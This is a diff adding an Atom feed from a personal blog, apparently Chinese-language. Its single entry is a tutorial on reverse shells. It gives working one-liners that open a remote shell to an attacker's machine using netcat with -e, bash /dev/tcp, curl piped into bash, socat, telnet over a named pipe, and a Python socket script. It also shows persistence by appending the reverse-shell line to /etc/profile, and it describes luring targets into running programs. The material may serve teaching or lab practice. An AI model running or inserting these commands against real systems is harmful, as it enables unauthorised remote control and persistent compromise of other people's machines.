@@ -1,0 +1,1047 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://www.sycamore.top</id>
+    <title>Sycamore&#39;s Blog • Posts by &#34;linux&#34; tag</title>
+    <link href="https://www.sycamore.top" />
+    <updated>2022-04-23T13:48:27.000Z</updated>
+    <category term="Python" />
+    <category term="计算机视觉" />
+    <category term="深度学习" />
+    <category term="Crypto" />
+    <category term="Hexo" />
+    <category term="shokaX" />
+    <category term="博客主题" />
+    <category term="实习" />
+    <category term="springboot" />
+    <category term="CTF" />
+    <category term="Misc" />
+    <category term="Web" />
+    <category term="Miec" />
+    <category term="Re" />
+    <category term="Pwn" />
+    <category term="Backdoor" />
+    <category term="Linux" />
+    <category term="Kali" />
+    <category term="Trojan horse" />
+    <category term="Metasploit" />
+    <category term="frp" />
+    <category term="shellter" />
+    <category term="Reverse Shell" />
+    <category term="Develop" />
+    <category term="Electron" />
+    <category term="Google Translate" />
+    <category term="node" />
+    <category term="Hitokoto" />
+    <category term="npm" />
+    <category term="plugs" />
+    <category term="RCE，loophole" />
+    <category term="毕业设计" />
+    <category term="机器学习" />
+    <category term="Diary" />
+    <category term="Australia" />
+    <category term="Mod" />
+    <category term="CP2077" />
+    <entry>
+        <id>https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%8F%8D%E5%BC%B9-shell/</id>
+        <title>反弹_shell</title>
+        <link rel="alternate" href="https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%8F%8D%E5%BC%B9-shell/"/>
+        <content type="html">&lt;h1 id=&#34;什么是反弹shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是反弹shell&#34;&gt;#&lt;/a&gt; 什么是反弹 shell？&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;正向连接&lt;/strong&gt;，就是攻击者用自己的&lt;strong&gt;攻击机&lt;/strong&gt;连接到&lt;strong&gt;目标主机&lt;/strong&gt;的某一端口，&lt;strong&gt;常见&lt;/strong&gt;的有 web 服务、ssh、远程桌面等等。&lt;/p&gt;
+&lt;p&gt;在&lt;strong&gt;实际情况&lt;/strong&gt;下，总会有很多时候，我们&lt;strong&gt;不能&lt;/strong&gt;通过正向连接访问到目标主机，这个时候就可以利用&lt;strong&gt;反向连接&lt;/strong&gt;来实现。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;反向连接&lt;/strong&gt;，通俗来说就是，攻击者&lt;strong&gt;监听&lt;/strong&gt;某个攻击机的指定端口，目标主机&lt;strong&gt;主动发起请求&lt;/strong&gt;到该端口，并将&lt;strong&gt;命令行的输入输出&lt;/strong&gt;转到攻击机上显示。&lt;/p&gt;
+&lt;h1 id=&#34;适用情况&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#适用情况&#34;&gt;#&lt;/a&gt; 适用情况&lt;/h1&gt;
+&lt;p&gt;反弹 shell 适用于如下几种常见的情况：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;目标机因&lt;strong&gt;防火墙&lt;/strong&gt;受限，目标机器只能发送请求，不能接收请求。
+&lt;ul&gt;
+&lt;li&gt;所以让目标机&lt;strong&gt;主动发送请求&lt;/strong&gt;到攻击机指定端口来 &lt;strong&gt;getshell&lt;/strong&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;目标机端口&lt;strong&gt;被占用&lt;/strong&gt;。
+&lt;ul&gt;
+&lt;li&gt;但是&lt;strong&gt;攻击机&lt;/strong&gt;不会存在什么&lt;strong&gt;端口限制&lt;/strong&gt;&lt;br /&gt;
+ &amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;攻击者&lt;strong&gt;无法预知&lt;/strong&gt;目标机什么时候会中病毒、木马，对方的网络环境是什么样的，什么时候开关机。
+&lt;ul&gt;
+&lt;li&gt;所以采用 &lt;strong&gt;监听 + 诱骗目标机主动执行某程序&lt;/strong&gt; 的方式获得 &lt;strong&gt;shell&lt;/strong&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;虽然目标机中了招，但是目标机位于&lt;strong&gt;局域网&lt;/strong&gt;，或 IP 会&lt;strong&gt;动态变化&lt;/strong&gt;。
+&lt;ul&gt;
+&lt;li&gt;不能获得&lt;strong&gt;可用的 IP&lt;/strong&gt; 地址&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;实现方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#实现方式&#34;&gt;#&lt;/a&gt; 实现方式&lt;/h1&gt;
+&lt;p&gt;反弹 shell 的方式有很多，那具体要用哪种方式还需要根据 目标主机的&lt;strong&gt;环境&lt;/strong&gt; 来确定，&lt;br /&gt;
+比如：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;如果有 &lt;strong&gt;netcat&lt;/strong&gt; 或者 &lt;strong&gt;Socat&lt;/strong&gt; 或者 &lt;strong&gt;Telnet&lt;/strong&gt; 工具，那么可以利用 &lt;strong&gt;任意这三者之一&lt;/strong&gt; 反弹 shell，&lt;/li&gt;
+&lt;li&gt;如果 &lt;strong&gt;bash&lt;/strong&gt; 可用，那么可以利用 bash 反弹 shell，&lt;/li&gt;
+&lt;li&gt;如果具有 &lt;strong&gt;python&lt;/strong&gt; 或者 &lt;strong&gt;php&lt;/strong&gt; 的环境，那么可以利用 &lt;strong&gt;这些语言的脚本&lt;/strong&gt; 反弹 shell。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;利用-netcat-反弹shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-netcat-反弹shell&#34;&gt;#&lt;/a&gt; 利用 netcat 反弹 shell&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Netcat&lt;/strong&gt;（即 &lt;strong&gt;nc&lt;/strong&gt; ） 是一款简单的 Unix 工具，使用 UDP 和 TCP 协议。它可以轻易的建立任何连接。&lt;/p&gt;
+&lt;h3 id=&#34;准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#准备&#34;&gt;#&lt;/a&gt; 准备：&lt;/h3&gt;
+&lt;p&gt;目前，默认的各个 &lt;strong&gt;linux&lt;/strong&gt; 发行版本已经自带了 &lt;strong&gt;netcat&lt;/strong&gt; 工具包。&lt;/p&gt;
+&lt;p&gt;但是有部分版本的 &lt;strong&gt;netcat&lt;/strong&gt; 的 &lt;strong&gt;-e&lt;/strong&gt; 功能 被阉割了&lt;br /&gt;
+（大概是出于安全考虑，因为 &lt;strong&gt;-e&lt;/strong&gt; 可以直接发布与反弹本地 &lt;strong&gt;shell&lt;/strong&gt;）&lt;/p&gt;
+&lt;p&gt;对于这种情况，需要&lt;strong&gt;手动下载安装包&lt;/strong&gt;，命令如下：&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget https://jaist.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -xvzf netcat-0.7.1.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./configure&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make &amp;amp;&amp;amp; make install&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make clean&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;攻击机开启监听&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击机开启监听&#34;&gt;#&lt;/a&gt; 攻击机开启监听：&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;格式： &lt;code&gt;nc -lvvp &amp;lt;攻击机监听的端口&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;code&gt;netcat -lvvp 23333&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443777/Typera/2023/04/074dea0aeb65e3cf991579314a98284c.png&#34; alt=&#34;image-20230426012933906&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;目标机主动连接攻击机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目标机主动连接攻击机&#34;&gt;#&lt;/a&gt; 目标机主动连接攻击机：&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;格式： &lt;code&gt;nc &amp;lt;攻击机IP&amp;gt; &amp;lt;攻击机监听的端口&amp;gt; -e /bin/bash&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;code&gt;netcat 192.168.158.139 23333 -e /bin/bash&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443773/Typera/2023/04/f52bbdd3389beb7c7a9e9da72e220e40.png&#34; alt=&#34;image-20230426012929850&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;（&lt;strong&gt;必须&lt;/strong&gt;攻击机&lt;strong&gt;先&lt;/strong&gt;开始 &lt;strong&gt;监听&lt;/strong&gt;，目标机&lt;strong&gt;再反弹 shell&lt;/strong&gt;，这样才会有效果）&lt;/p&gt;
+&lt;p&gt;成功反弹 shell：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443770/Typera/2023/04/9284a9b2e6290d96a8b65313b24f91a3.png&#34; alt=&#34;image-20230426012926374&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;利用-bash-反弹-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-bash-反弹-shell&#34;&gt;#&lt;/a&gt; 利用 Bash 反弹 shell&lt;/h2&gt;
+&lt;p&gt;使用 Bash 中 &lt;strong&gt;网络重定向&lt;/strong&gt; 的方法&lt;/p&gt;
+&lt;h3 id=&#34;准备-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#准备-2&#34;&gt;#&lt;/a&gt; 准备：&lt;/h3&gt;
+&lt;p&gt;Kali Linux 中使用的 &lt;strong&gt;Shell&lt;/strong&gt; 是 &lt;strong&gt;zsh&lt;/strong&gt;，&lt;br /&gt;
+可以用命令： &lt;code&gt;echo %SHELL&lt;/code&gt;  查看当前系统使用的 &lt;strong&gt;Shell&lt;/strong&gt;：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443763/Typera/2023/04/8d5285fdf9ee6db10ebba4ce645ad92c.png&#34; alt=&#34;image-20230426012919215&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;所以我们需要更换 Shell：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;更换： &lt;code&gt;chsh -s /bin/bash&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;重启： &lt;code&gt;reboot&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443759/Typera/2023/04/a9c9ebe071eae7546dacb18ebc0bb277.png&#34; alt=&#34;image-20230426012915317&#34; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;[注意]：&lt;/strong&gt; 出现下图错误只是因为 &lt;strong&gt;攻击机 没开监听&lt;/strong&gt;：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443751/Typera/2023/04/8854676b35906672629c5fc26ad8a02f.png&#34; alt=&#34;image-20230426012907770&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;另外，Debian 中，部分版本可能默认&lt;strong&gt;没开&lt;/strong&gt; bash 的 网络重定向 选项，&lt;/p&gt;
+&lt;p&gt;对于这种情况，我们只能：加上 &lt;code&gt;--enable-net-redirections&lt;/code&gt;  &lt;strong&gt;重新编译 bash&lt;/strong&gt;&lt;br /&gt;
+ 详见我的另一篇文章：&lt;a href=&#34;&#34;&gt;【从源码重新编译 Bash：重定向功能】&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令&#34;&gt;#&lt;/a&gt; 命令：&lt;/h3&gt;
+&lt;p&gt;（攻击机&lt;strong&gt;事先&lt;/strong&gt;开启 本地监听）&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;格式： &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/攻击机IP/攻击机端口 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.158.139/23333 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;成功反弹 shell：&lt;/strong&gt;&lt;br /&gt;
+&lt;strong&gt;目标机&lt;/strong&gt; 界面 (反弹)：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443746/Typera/2023/04/c693896f2e2fa73809cee178b0f6533b.png&#34; alt=&#34;image-20230426012903048&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击机&lt;/strong&gt; 界面 (监听)：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443743/Typera/2023/04/6fb9f5e48c00f60ba91673a9f6c734eb.png&#34; alt=&#34;image-20230426012858851&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;详细解释&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#详细解释&#34;&gt;#&lt;/a&gt; 详细解释：&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;bash -i&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;产生一个 &lt;strong&gt;bash&lt;/strong&gt; 交互环境。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;gt;&amp;amp;&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;把联合符号 前面 的内容与 后面 相结合，然后一起&lt;strong&gt;重定向&lt;/strong&gt;给后者。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/dev/tcp/192.168.158.139/23333&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/dev/tcp/ip/port&lt;/code&gt;  是 &lt;strong&gt;bash&lt;/strong&gt; 中定义的一个方法，&lt;/li&gt;
+&lt;li&gt;作用是：让攻击机 (192.168.158.139) 和目标机，在攻击机的 23333 端口上，建立一个 &lt;strong&gt;tcp&lt;/strong&gt; 连接。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;0&amp;gt;&amp;amp;1&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;0、1 为&lt;strong&gt;文件描述符&lt;/strong&gt;。&lt;/li&gt;
+&lt;li&gt;即将 &lt;strong&gt;标准输入 (0)&lt;/strong&gt; 与 &lt;strong&gt;标准输出 (1)&lt;/strong&gt; 的内容相结合，然后&lt;strong&gt;重定向&lt;/strong&gt;给前面 &lt;strong&gt;标准输出 (1)&lt;/strong&gt; 的内容。（在反弹 shell 中实现 &lt;strong&gt;输入输出&lt;/strong&gt; 的关键）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;curl-配合-bash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#curl-配合-bash&#34;&gt;#&lt;/a&gt; Curl 配合 Bash&lt;/h3&gt;
+&lt;p&gt;丰富一下用 Bash 反弹 Shell 的手段&lt;br /&gt;
+（Curl 的命令借助了 Linux 中的管道）&lt;/p&gt;
+&lt;h4 id=&#34;1-准备-indexphp-文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-准备-indexphp-文件&#34;&gt;#&lt;/a&gt; 1. 准备 index.php 文件：&lt;/h4&gt;
+&lt;p&gt;攻击机中创建  &lt;code&gt;index.php&lt;/code&gt;  文件，&lt;br /&gt;
+填写的&lt;strong&gt;内容&lt;/strong&gt;为：直接使用  &lt;code&gt;Bash&lt;/code&gt;  反弹 &lt;strong&gt;Shell&lt;/strong&gt; 的情况下，目标机中运行的命令，即：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.158.139/23333 0&amp;gt;&amp;amp;1&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;存放&lt;/strong&gt;在 &lt;strong&gt;web&lt;/strong&gt; 目录下，&lt;br /&gt;
+演示的 &lt;strong&gt;Kali Linux&lt;/strong&gt; 虚拟机开启 &lt;strong&gt;Apache2&lt;/strong&gt; 服务之后，对应目录为： &lt;code&gt;/var/www/html/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;开启 &lt;strong&gt;Apache2&lt;/strong&gt; 服务之后，会在上述目录下生成一个  &lt;code&gt;index.php&lt;/code&gt;  文件，&lt;br /&gt;
+可以直接删去内容并 &lt;strong&gt;修改&lt;/strong&gt;，该文件只是生成一个 &lt;strong&gt;web&lt;/strong&gt; 页面而已（如下图）&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443737/Typera/2023/04/97eb1b3565e6f8745bf100a9b5ee31ed.png&#34; alt=&#34;image-20230426012853268&#34; /&gt;&lt;/p&gt;
+&lt;h4 id=&#34;2-攻击机打开-23333-端口的监听&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-攻击机打开-23333-端口的监听&#34;&gt;#&lt;/a&gt; 2. 攻击机打开 23333 端口的监听&lt;/h4&gt;
+&lt;p&gt;命令： &lt;code&gt;netcat -lvvp 23333&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;3-目标机输入-curl-命令反弹-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-目标机输入-curl-命令反弹-shell&#34;&gt;#&lt;/a&gt; 3. 目标机输入 Curl 命令反弹 shell&lt;/h4&gt;
+&lt;p&gt;命令： &lt;code&gt;curl 192.168.158.139|bash&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;实现如图：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443723/Typera/2023/04/66bf859ff6c462a364624b51a215fd64.png&#34; alt=&#34;image-20230426012839981&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;成功反弹 &lt;strong&gt;Shell&lt;/strong&gt;：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443715/Typera/2023/04/01742775f569ce91fa25a5f8f25ed544.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;bash-反弹命令写入-etcprofile-文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bash-反弹命令写入-etcprofile-文件&#34;&gt;#&lt;/a&gt; Bash 反弹命令写入 /etc/profile 文件&lt;/h3&gt;
+&lt;p&gt;文件  &lt;code&gt;/etc/profile&lt;/code&gt;  中的内容，会在 &lt;strong&gt;Bash&lt;/strong&gt; 窗口打开时执行。&lt;/p&gt;
+&lt;h4 id=&#34;如图&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#如图&#34;&gt;#&lt;/a&gt; 如图：&lt;/h4&gt;
+&lt;blockquote&gt;
+&lt;p&gt;（下图中我输入的是&lt;strong&gt;错误的代码&lt;/strong&gt;，所以&lt;strong&gt;启动 Bash&lt;/strong&gt; 之后，会&lt;strong&gt;输出报错&lt;/strong&gt;内容到命令行）&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443705/Typera/2023/04/92211d839dd171dc8f115e037f1e07eb.png&#34; alt=&#34;image-20230426012821415&#34; /&gt;&lt;br /&gt;
+（如果是&lt;strong&gt;正确的代码&lt;/strong&gt;，但是攻击侧&lt;strong&gt;没开监听&lt;/strong&gt;，也会报错，如下图：）&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443709/Typera/2023/04/566b0ca11a943f96d0bf550e848d84d4.png&#34; alt=&#34;image-20230426012825282&#34; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&#34;布置的步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#布置的步骤&#34;&gt;#&lt;/a&gt; 布置的步骤：&lt;/h4&gt;
+&lt;p&gt;通过  &lt;code&gt;vim /etc/profile&lt;/code&gt; ，编辑文件：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443699/Typera/2023/04/6a8db3c08c0188c7b0a9b1d25fed3c50.png&#34; alt=&#34;image-20230426012816962&#34; /&gt;&lt;br /&gt;
+&amp;lt;br&amp;gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在末尾添加代码： &lt;code&gt;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.158.139/23333 0&amp;gt;&amp;amp;1 &amp;amp;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;该命令比直接反弹的代码在 &lt;strong&gt;末尾&lt;/strong&gt; 多了一个 &lt;strong&gt;&amp;amp;&lt;/strong&gt;，&lt;br /&gt;
+这是为了让打开 &lt;strong&gt;Bash&lt;/strong&gt; 的用户能正常使用&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443696/Typera/2023/04/bf591833811a31c67bcfb2741ab7ca30.png&#34; alt=&#34;image-20230426012812596&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;演示：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;攻击机开始监听 23333 端口&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Xshell&lt;/strong&gt; 打开目标机的会话（即&lt;strong&gt;启动了 Bash&lt;/strong&gt;）&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443691/Typera/2023/04/1fe57f518c02b5c5651dc8fbfe3269c7.png&#34; alt=&#34;image-20230426012807425&#34; /&gt;&lt;/li&gt;
+&lt;li&gt;没有回显，且攻击机&lt;strong&gt;成功 getshell&lt;/strong&gt;，&lt;strong&gt;反弹成功&lt;/strong&gt;&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443688/Typera/2023/04/5d329939a4e8d82c53c712f4b54adb09.png&#34; alt=&#34;image-20230426012804072&#34; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;利用-socat-反弹-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-socat-反弹-shell&#34;&gt;#&lt;/a&gt; 利用 Socat 反弹 Shell&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Socat&lt;/strong&gt; 是 &lt;strong&gt;Linux&lt;/strong&gt; 下一个多功能的网络工具，功能与 &lt;strong&gt;netcat (nc)&lt;/strong&gt; 类似。&lt;br /&gt;
+所以我们也可以使用 &lt;strong&gt;Socat&lt;/strong&gt;，开监听、反弹 &lt;strong&gt;Shell&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;下载-socat&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载-socat&#34;&gt;#&lt;/a&gt; 下载 Socat&lt;/h3&gt;
+&lt;p&gt;试验之前，要先下载 &lt;strong&gt;Socat&lt;/strong&gt;（&lt;strong&gt;Kali Linux&lt;/strong&gt; 已经&lt;strong&gt;预装&lt;/strong&gt;了该工具），&lt;br /&gt;
+如果没有安装，使用命令： &lt;code&gt;apt-get install socat&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;攻击机开启监听-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击机开启监听-2&#34;&gt;#&lt;/a&gt; 攻击机开启监听&lt;/h3&gt;
+&lt;p&gt;命令： &lt;code&gt;socat TCP-LISTEN:23333 -&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443682/Typera/2023/04/f6ffc230be89565c17383bbe1e8262a3.png&#34; alt=&#34;image-20230426012759404&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;目标机通过-socat-建立连接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目标机通过-socat-建立连接&#34;&gt;#&lt;/a&gt; 目标机通过 Socat 建立连接&lt;/h3&gt;
+&lt;p&gt;命令： &lt;code&gt;socat tcp-connect:192.168.158.139:23333 exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443678/Typera/2023/04/00614ff7b3a1a2dfdfbad02dc0df8be1.png&#34; alt=&#34;image-20230426012754642&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;成功&lt;/strong&gt; 反弹 &lt;strong&gt;Shell&lt;/strong&gt;：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443674/Typera/2023/04/7b31e1aa07c5c4bdcbd9e6cafad1655a.png&#34; alt=&#34;image-20230426012750258&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;利用-telnet-反弹-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-telnet-反弹-shell&#34;&gt;#&lt;/a&gt; 利用 Telnet 反弹 Shell&lt;/h2&gt;
+&lt;p&gt;我们总会遇到，目标机 &lt;strong&gt;Netcat&lt;/strong&gt; 和  &lt;code&gt;/dev/tcp/&lt;/code&gt;  方法不可用的情况，&lt;br /&gt;
+这时候如果 目标机配有 &lt;strong&gt;Telnet&lt;/strong&gt; 服务，我们可以用 &lt;strong&gt;Telnet&lt;/strong&gt; 建立反向连接。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;攻击机开启监听&lt;br /&gt;
+（用 &lt;strong&gt;nc&lt;/strong&gt; 或者 &lt;strong&gt;socat&lt;/strong&gt; 都行）&lt;/li&gt;
+&lt;li&gt;目标机执行命令，建立连接：&lt;br /&gt;
+ &lt;code&gt;mknod a p; telnet 47.xxx.xxx.72 2333 0&amp;lt;a | /bin/bash 1&amp;gt;a&lt;/code&gt; &lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443663/Typera/2023/04/db443fe2827a018ce3cb046f63793326.png&#34; alt=&#34;image-20230426012739427&#34; /&gt;&lt;/li&gt;
+&lt;li&gt;成功获得 &lt;strong&gt;反弹 Shell&lt;/strong&gt;：&lt;br /&gt;
+&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682443657/Typera/2023/04/d3d507d38eb37d836868b42d5f90db17.png&#34; alt=&#34;image-20230426012732507&#34; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;用-python-脚本反弹-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用-python-脚本反弹-shell&#34;&gt;#&lt;/a&gt; 用 Python 脚本反弹 Shell&lt;/h2&gt;
+&lt;p&gt;使用 &lt;strong&gt;Python&lt;/strong&gt; 的 &lt;strong&gt;socket&lt;/strong&gt; 库&lt;/p&gt;
+&lt;p&gt;攻击机开启监听后，直接使用命令：&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.158.139&amp;quot;,23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+（或者也可以转化成 .py 的 Python 文件，然后命令行执行）&lt;/p&gt;
